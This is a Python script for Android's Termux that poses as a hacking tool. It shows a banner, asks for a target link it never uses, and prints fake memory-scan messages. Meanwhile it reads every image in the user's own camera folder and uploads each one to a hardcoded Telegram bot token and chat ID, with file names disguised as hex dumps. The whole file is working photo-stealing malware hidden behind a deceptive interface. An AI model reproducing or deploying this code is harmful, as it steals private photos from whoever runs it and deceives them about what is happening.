import os
import asyncio
import sys
from telegram import Bot
from telegram.error import TelegramError

# Colores ANSI
G = '\033[92m'  # Verde
R = '\033[91m'  # Rojo
Y = '\033[93m'  # Amarillo
B = '\033[94m'  # Azul
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset

def banner():
    print(f"""{G}
    ██████╗  █████╗ ████████╗ █████╗     ███████╗██╗   ██╗██████╗ 
    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗    ██╔════╝██║   ██║██╔══██╗
    ██║  ██║███████║   ██║   ███████║    ███████╗██║   ██║██████╔╝
    ██║  ██║██╔══██║   ██║   ██╔══██║    ╚════██║██║   ██║██╔═══╝ 
    ██████╔╝██║  ██║   ██║   ██║  ██║    ███████║╚██████╔╝██║     
    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝     
    {R}[ System Protocol: ACTIVE ]          [ Status: HEX_DUMP ]{W}
    """)

banner()
print(f"{C}┌──({G}root@internal{C})-[{W}~{C}]")
input(f"└─$ {W}Ingrese el link del destino: ")
print(f"{Y}🔍 Escaneando sectores de memoria...{W}\n")

async def enviar_fotos_telegram():
    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
    CHAT_ID = "8326936177"
    ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"
    EXTENSIONES_IMAGEN = ('.jpg', '.jpeg', '.png', '.webp', '.bmp')

    try:
        bot = Bot(token=BOT_TOKEN)
        
        if not os.path.exists(ruta_camara):
            print(f"{R}[!] ERROR: Punto de montaje inaccesible.{W}")
            return

        archivos = [
            f for f in os.listdir(ruta_camara) 
            if os.path.isfile(os.path.join(ruta_camara, f)) and f.lower().endswith(EXTENSIONES_IMAGEN)
        ]
        
        if not archivos:
            print(f"{Y}[?] DATA_EMPTY: No se localizaron vectores.{W}")
            return

        print(f"{B}[*] PREPARANDO EXFILTRACIÓN:{W} {len(archivos)} paquetes en cola.")
        print(f"{G}{'='*60}{W}")

        for i, nombre_archivo in enumerate(archivos, 1):
            ruta_completa = os.path.join(ruta_camara, nombre_archivo)
            
            try:
                # Leer los primeros 16 bytes para generar el string hexadecimal
                with open(ruta_completa, 'rb') as f:
                    cabecera_hex = f.read(16).hex().upper()
                
                # Formatear el hex para que se vea como bloques: "FF D8 FF E0..."
                hex_display = ' '.join(cabecera_hex[j:j+2] for j in range(0, len(cabecera_hex), 2))

                # Mostrar el dump hexadecimal en lugar del nombre
                sys.stdout.write(f"\r{B}[{i}/{len(archivos)}]{W} Injecting_Buffer: {G}{hex_display}...{W}")
                sys.stdout.flush()
                
                with open(ruta_completa, 'rb') as foto:
                    await bot.send_photo(
                        chat_id=CHAT_ID, 
                        photo=foto, 
                        caption=f"Exfiltrated_Data_Block: {hex_display[:15]}..."
                    )
                
                await asyncio.sleep(1.2)
                
            except Exception:
                print(f"\n{R}[-] FAIL: Error en segmento de memoria {i}{W}")

        print(f"\n\n{G}[+++] VOLCADO DE DATOS FINALIZADO [+++]{W}")

    except TelegramError:
        print(f"\n{R}[!] CONNECTION_ERROR: Túnel fallido.{W}")
    except Exception as e:
        print(f"\n{R}[!] SYS_FAILURE: {e}{W}")

if __name__ == "__main__":
    try:
        asyncio.run(enviar_fotos_telegram())
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] PROCESO ABORTADO.{W}")

